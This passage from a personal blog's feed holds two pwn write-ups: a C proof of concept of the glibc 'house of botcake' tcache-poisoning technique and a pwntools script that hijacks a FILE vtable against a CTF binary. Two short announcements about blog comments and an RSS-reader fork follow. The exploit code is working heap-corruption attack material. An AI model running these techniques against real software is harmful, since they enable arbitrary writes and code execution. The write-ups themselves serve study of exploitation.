class="number">4</span>];</span><br><span class="line">    <span class="type">size_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) x[i] = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="type">size_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="type">size_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//padding chunk or will double free</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(x[i]);</span><br><span class="line">    <span class="built_in">free</span>(a);  <span class="comment">// a in unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);  <span class="comment">// a in tcache</span></span><br><span class="line">    <span class="type">size_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0xb0</span>);</span><br><span class="line">    b[<span class="number">0x90</span>/<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = (<span class="type">size_t</span>)((<span class="type">long</span>)stack_var ^ ((<span class="type">long</span>)a &gt;&gt; <span class="number">12</span>));<span class="comment">// poison tcache</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="type">size_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    assert(c == stack_var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C demo idea: first apply for 7 chunks to fill up tc, then apply for 2 chunks for triggering, and a chunk for isolating the top to prevent overwriting the top chunk</p><p>  Then free the first 7 chunks in turn, enter tc, free a chunk again, enter the unsorted bin, and then free a chunk in front of the unsort bin, which will be merged and merged.</p><p>Apply for a chunk again. At this time, it will be applied from tc. After the application is released, tc will be reduced from 7 to 6. At this time, you will free the chunk that has just entered the unsortbin and enter tc. At this time, you can use the bypass key. In fact, this method It is to let the chunk enter the unsortbin first, and then let the unsortbin chunk enter the tc, so that the tc key can be bypassed, and the following can be arbitrarily written and hijacked</p><p>tchace key source code:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">  <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">  <span class="comment">/* Check to see if it&#x27;s already in the tcache.  */</span></span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* This test succeeds on double free.  However, we don&#x27;t 100%</span></span><br><span class="line"><span class="comment">     trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">     2^&lt;size_t&gt; chance), so verify it&#x27;s not an unlikely</span></span><br><span class="line"><span class="comment">     coincidence before aborting.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_entry *tmp;</span><br><span class="line">      LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">      <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">       tmp;</span><br><span class="line">       tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)</span><br><span class="line">      malloc_printerr (<span class="string">&quot;free(): double free detected in tcache 2&quot;</span>);</span><br><span class="line">      <span class="comment">/* If we get here, it was a coincidence.  We&#x27;ve wasted a</span></span><br><span class="line"><span class="comment">         few cycles, but don&#x27;t abort.  */</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>If a chunk is freed into tc, it will detect the value of the key. If it is the same, it will traverse and detect the same address. If there is the same address, it will trigger double free. At this time, we can let it enter the unsortbin first. At this time, the value of the key is not equal. , and then arbitrarily hijacking double free will not report the error â€œfree(): double free detected in tcache 2â€. At this time, other methods are used, such as: off-by-one&#x2F;null heap overflow or UAF coverage bk reaches any hijacked operation<br>The final effect:<br>![730JX508C])$FK@THV85]IK.png]<a href="http://azly.top/usr/uploads/2022/10/769705769.png">1</a></p><p>Summary: I am preparing for the provincial competition recently, and I have read very little knowledge about pwn, woohoo, after the provincial competition, I will all devote myself to PWN, NO PWN NO FUN!!!!!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN-house-of-botcake&quot;&gt;&lt;a href=&quot;#PWN-house-of-botcake&quot; class=&quot;headerlink&quot; title=&quot;PWN house_of_botcake&quot;&gt;&lt;/a&gt;PWN house_of_botcake&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>PWN IOfile simple record</title>
    <link href="https://jsjsj.top/2022/08/03/PWN%20IOfile%20simple%20record/"/>
    <id>https://jsjsj.top/2022/08/03/PWN%20IOfile%20simple%20record/</id>
    <published>2022-08-03T13:47:08.000Z</published>
    <updated>2023-10-04T06:35:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN-IOfile-simple-record-1"><a href="#PWN-IOfile-simple-record-1" class="headerlink" title="PWN IOfile simple record (1)"></a>PWN IOfile simple record (1)</h1><p>PWN IO getc discussion</p><p>When getc will make _IO_buf_base empty, go to _IO_doallocbuf when it is empty</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">scanf:</span><br><span class="line"> if (fp-&gt;_IO_buf_base == NULL)</span><br><span class="line">   &#123;</span><br><span class="line">     /* Maybe we already have a push back pointer.  */</span><br><span class="line">     if (fp-&gt;_IO_save_base != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  free (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">     _IO_doallocbuf (fp);</span><br><span class="line">   &#125;</span><br><span class="line"> _IO_doallocbuf:</span><br><span class="line">void_IO_doallocbuf (_IO_FILE *fp)&#123;  if (fp-&gt;_IO_buf_base) # How to input buffer is not empty, return directly    return;  </span><br><span class="line">if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0) #check flag</span><br><span class="line">if (_IO_DOALLOCATE (fp) != EOF) ## call vtable function     return;  _</span><br><span class="line">IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);&#125;</span><br><span class="line">libc_hidden_def (_IO_doallocbuf)</span><br></pre></td></tr></table></figure><p>_IO_doallocbufï¼š</p><p>Then trigger vtable to complete any hijacking, this question has a backdoor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./chall&#x27;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">io = process(binary, aslr = <span class="number">1</span>)</span><br><span class="line"><span class="comment">#$io = remote(&#x27;127.0.0.1&#x27;, 30001)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">myu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ub_offset = <span class="number">0x3c4b30</span></span><br><span class="line">codebase = <span class="number">0x555555554000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">    <span class="comment"># io.recvuntil(&#x27;choice: &#x27;)</span></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make</span>(<span class="params">sz, d, idx=<span class="number">0</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">    io.sendline(d)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">make(<span class="number">0x500</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">make(<span class="number">0x500</span>, <span class="string">&#x27;b&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">make(<span class="number">0x500</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your buf: &quot;</span>)</span><br><span class="line">libc_addr = myu64(io.recvn(<span class="number">6</span>)) &amp; ((<span class="number">1</span>&lt;&lt;<span class="number">64</span>) - <span class="number">1</span> - <span class="number">0xff</span>)</span><br><span class="line"><span class="keyword">if</span> libc_addr &amp; <span class="number">0xf000</span> != <span class="number">0</span>:</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">stdin_addr = libc_addr - <span class="number">0x160</span></span><br><span class="line">libc_base = libc_addr - <span class="number">0x219c00</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># lets overwrite the stdin-&gt;_IO_buf_base</span></span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;pie breakpoint 0x15396\nc\n&#x27;)</span></span><br><span class="line">gdb.attach(io,<span class="string">&quot;b _IO_doallocbuf\n&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">menu(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(stdin_addr+<span class="number">0x38</span>+<span class="number">2</span>))</span><br><span class="line">io.recvuntil(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># use scanf to send payload</span></span><br><span class="line">ptr_chk_guard_addr = libc_base - <span class="number">0x2890</span> <span class="comment"># this guy lies in the tls. not ld.so</span></span><br><span class="line">gadget = <span class="number">0x406320</span> </span><br><span class="line">system = libc_base + <span class="number">0x508f2</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">scanf:</span></span><br><span class="line"><span class="string"> if (fp-&gt;_IO_buf_base == NULL)</span></span><br><span class="line"><span class="string">   &#123;</span></span><br><span class="line"><span class="string">     /* Maybe we already have a push back pointer.  */</span></span><br><span class="line"><span class="string">     if (fp-&gt;_IO_save_base != NULL)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  free (fp-&gt;_IO_save_base);</span></span><br><span class="line"><span class="string">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">     _IO_doallocbuf (fp);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"> _IO_doallocbuf:</span></span><br><span class="line"><span class="string">void_IO_doallocbuf (_IO_FILE *fp)&#123;  if (fp-&gt;_IO_buf_base) # How to input buffer is not empty, return directly return; </span></span><br><span class="line"><span class="string">if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; 0) #check flag</span></span><br><span class="line"><span class="string">if (_IO_DOALLOCATE (fp) != EOF) ## call vtable function      return;  _</span></span><br><span class="line"><span class="string">IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+1, 0);&#125;</span></span><br><span class="line"><span class="string">libc_hidden_def (_IO_doallocbuf)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">fake_io = p32(<span class="number">0xfbad208b</span>) + <span class="string">b&#x27;;sh;&#x27;</span></span><br><span class="line"><span class="comment">#fake_io += p64(ptr_chk_guard_addr) + p64(ptr_chk_guard_addr + 8)</span></span><br><span class="line"><span class="comment">#fake_io += p64(ptr_chk_guard_addr + 8)</span></span><br><span class="line"><span class="comment">#fake_io += p64(ptr_chk_guard_addr) * 4</span></span><br><span class="line"><span class="comment">#fake_io += p64(ptr_chk_guard_addr + 8)</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0xa0</span>-<span class="number">8</span>-<span class="number">3</span>)</span><br><span class="line">payload += p64(gadget)  <span class="comment">#vtable</span></span><br><span class="line"><span class="comment">#payload += b&#x27;\x00&#x27; * 0x200</span></span><br><span class="line"><span class="comment">#payload = payload.ljust(0xa70, b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment">#payload += b&#x27;c&#x27; * 13 #+ fake_io</span></span><br><span class="line"><span class="comment">#payload = b&#x27;\x00&#x27; * 0x10</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;choice: &#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PWN-IOfile-simple-record-1&quot;&gt;&lt;a href=&quot;#PWN-IOfile-simple-record-1&quot; class=&quot;headerlink&quot; title=&quot;PWN IOfile simple record (1)&quot;&gt;&lt;/a&gt;PWN IO</summary>
      
    
    
    
    <category term="pwn" scheme="https://jsjsj.top/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://jsjsj.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>test_images</title>
    <link href="https://jsjsj.top/2021/10/04/test-images/"/>
    <id>https://jsjsj.top/2021/10/04/test-images/</id>
    <published>2021-10-04T03:02:45.000Z</published>
    <updated>2023-10-04T06:57:16.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/test.jpeg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/test.jpeg&quot;&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>About Comments</title>
    <link href="https://jsjsj.top/2021/07/16/About-Comments/"/>
    <id>https://jsjsj.top/2021/07/16/About-Comments/</id>
    <published>2021-07-15T16:00:00.000Z</published>
    <updated>2023-08-18T06:08:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>I havenâ€™t updated my blog for a long time. Recently, I found some unkind comments here, but they are not allowed. So, I removed them then. I think I have to make some changes.</p><p>From now on, I will check comments more frequently and will deal with the unkind comments I found. If you found any unkind comments, feel free to tell me to remove them.</p><p>Plus, comments area is not for testing, itâ€™s for sharing and exchanging amazing ideas about the post with others. So, test comments will be removed, too.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;I havenâ€™t updated my blog for a long time. Recently, I found some unkind comments here, but they are not allowed. So, I removed them then</summary>
      
    
    
    
    <category term="Announcement" scheme="https://jsjsj.top/categories/Announcement/"/>
    
    
    <category term="misc" scheme="https://jsjsj.top/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>Acrylic Reader is Here</title>
    <link href="https://jsjsj.top/2020/08/30/Acrylic-Reader-is-Here/"/>
    <id>https://jsjsj.top/2020/08/30/Acrylic-Reader-is-Here/</id>
    <published>2020-08-29T16:00:00.000Z</published>
    <updated>2023-08-18T06:08:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/MrWillCom/acrylic-reader">Acrylic Reader</a> project is launched.</p><span id="more"></span><p>After my 2 recent pull requests to <a href="https://hyliu.me/fluent-reader/">Fluent Reader</a>, I gave up to merge new features to <a href="https://hyliu.me/fluent-reader/">Fluent Reader</a> because <a href="https://github.com/yang991178">yang991178</a> closed both my 2 pull requests. To know more about this, read <a href="/2020/08/29/Closed-Closed-Again/">my recent post</a>.</p><div class="container">    <div style="margin: 32px 0; text-align: center">        <span title="Status: Closed" style="display:inline-block;padding:5px 12px;font-size:14px;font-weight:500;line-height:20px;color:#fff;text-align:center;white-space:nowrap;background-color:#6a737d;border:1px solid transparent;border-radius:2em; background-color: #28a745;">            <svg height="16" style="display:inline-block;fill:currentColor;vertical-align:text-bottom" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M14.064 0a8.75 8.75 0 00-6.187 2.563l-.459.458c-.314.314-.616.641-.904.979H3.31a1.75 1.75 0 00-1.49.833L.11 7.607a.75.75 0 00.418 1.11l3.102.954c.037.051.079.1.124.145l2.429 2.428c.046.046.094.088.145.125l.954 3.102a.75.75 0 001.11.418l2.774-1.707a1.75 1.75 0 00.833-1.49V9.485c.338-.288.665-.59.979-.904l.458-.459A8.75 8.75 0 0016 1.936V1.75A1.75 1.75 0 0014.25 0h-.186zM10.5 10.625c-.088.06-.177.118-.266.175l-2.35 1.521.548 1.783 1.949-1.2a.25.25 0 00.119-.213v-2.066zM3.678 8.116L5.2 5.766c.058-.09.117-.178.176-.266H3.309a.25.25 0 00-.213.119l-1.2 1.95 1.782.547zm5.26-4.493A7.25 7.25 0 0114.063 1.5h.186a.25.25 0 01.25.25v.186a7.25 7.25 0 01-2.123 5.127l-.459.458a15.21 15.21 0 01-2.499 2.02l-2.317 1.5-2.143-2.143 1.5-2.317a15.25 15.25 0 012.02-2.5l.458-.458h.002zM12 5a1 1 0 11-2 0 1 1 0 012 0zm-8.44 9.56a1.5 1.5 0 10-2.12-2.12c-.734.73-1.047 2.332-1.15 3.003a.23.23 0 00.265.265c.671-.103 2.273-.416 3.005-1.148z"></path></svg> Launched        </span>    </div></div><p>Acrylic Reader is fully based on <a href="https://hyliu.me/fluent-reader/">Fluent Reader</a> and will keep up to date with it. Also I will add and improve some features of it.</p><p><img src="/img/000012.png" alt="The logo of Acrylic Reader"></p><p>Go to <a href="https://github.com/MrWillCom/acrylic-reader">Acrylic Readerâ€™s GitHub home page</a> to know more about this project.</p><p>Till now, Acrylic Reader has 2 more features than Fluent Reader and 1 feature merged into Fluent Reader. But why didnâ€™t I merge them into Fluent Reader?</p><h2 id="Why-didnâ€™t-I-merge-them-into-Fluent-Reader"><a href="#Why-didnâ€™t-I-merge-them-into-Fluent-Reader" class="headerlink" title="Why didnâ€™t I merge them into Fluent Reader"></a>Why didnâ€™t I merge them into Fluent Reader</h2><p>I have tried twice to merge my new features to Fluent Reader, but failed twice. <a href="https://github.com/yang991178">yang991178</a> didnâ€™t review my pull requests and closed them. To know what pull requests they are, go to <a href="https://github.com/yang991178/fluent-reader/pull/86">yang991178&#x2F;fluent-reader #86</a> and <a href="https://github.com/yang991178/fluent-reader/pull/88">#88</a>.</p><div class="container">    <div style="margin: 32px 0; text-align: center">        <span title="Status: Closed" style="display:inline-block;padding:5px 12px;font-size:14px;font-weight:500;line-height:20px;color:#fff;text-align:center;white-space:nowrap;background-color:#6a737d;border:1px solid transparent;border-radius:2em; background-color: #d73a49;">            <svg height="16" style="display:inline-block;fill:currentColor;vertical-align:text-bottom" viewBox="0 0 16 16" version="1.1" width="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z"></path></svg> Closed        </span>    </div></div><p><a href="https://github.com/yang991178">yang991178</a> said that he thought my pull requestsâ€™s animation update is not necessary. But his animation is really rigid that cuts the shadow when playing. And said that my animation will squeeze the contents. But my animation doesnâ€™t.</p><p>I am really disappointed, but I want to keep my new features. So Acrylic Reader launched.</p><p>Acrylic Reader will give you a better experience and more useful features.</p><p>Iâ€™m glad to merge all of my new features to Fluent Reader if <a href="https://github.com/yang991178">yang991178</a> want to in the future.</p><p>To know what new features in Acrylic Reader are, visit <a href="https://mrwillcom.github.io/acrylic-reader/">the home page of Acrylic Reader</a>.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/MrWillCom/acrylic-reader&quot;&gt;Acrylic Reader&lt;/a&gt; project is launched.&lt;/p&gt;</summary>
    
    
    
    <category term="Announcement" scheme="https://jsjsj.top/categories/Announcement/"/>
    
    
    <category term="reader" scheme="https://jsjsj.top/tags/reader/"/>
    
    <category term="rss" scheme="https://jsjsj.top/tags/rss/"/>
    
  </entry>
  
</feed>
